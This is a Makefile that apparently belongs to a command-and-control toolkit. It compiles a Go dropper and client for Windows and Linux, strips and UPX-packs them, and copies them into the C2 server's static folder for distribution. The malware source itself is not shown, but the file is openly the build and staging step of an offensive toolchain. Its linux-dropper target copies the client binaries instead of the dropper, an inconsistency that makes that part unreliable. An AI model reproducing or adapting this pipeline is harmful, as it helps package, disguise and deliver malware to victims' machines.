dropper = godropper
client = gotrash
release = release/

flags = -ldflags="-s -w"

all: windows linux

windows: windows-dropper windows-client
linux: linux-dropper linux-client

windows-dropper: $(dropper).go
	GOOS=windows GOARCH=386 go build $(flags) -o $(release)$(dropper).exe $(dropper).go
	upx -f --brute $(release)$(dropper).exe -o $(release)$(dropper)-packed.exe
	cp $(release)$(dropper)*.exe ../c2trash/static/

windows-client: $(client).go
	GOOS=windows GOARCH=386 go build $(flags) -o $(release)$(client).exe $(client).go
	upx -f --brute $(release)$(client).exe -o $(release)$(client)-packed.exe
	cp $(release)$(client)*.exe ../c2trash/static/

linux-client: $(client).go
	GOOS=linux GOARCH=386 go build $(flags) -o $(release)$(client) $(client).go
	upx -f --brute $(release)$(client) -o $(release)$(client)-packed
	cp $(release)$(client)* ../c2trash/static/

linux-dropper: $(dropper).go
	GOOS=linux GOARCH=386 go build $(flags) -o $(release)$(dropper) $(dropper).go
	upx -f --brute $(release)$(dropper) -o $(release)$(dropper)-packed
	cp $(release)$(client)* ../c2trash/static/

setup:
	apt install golang upx -y
	go get crypto/tls
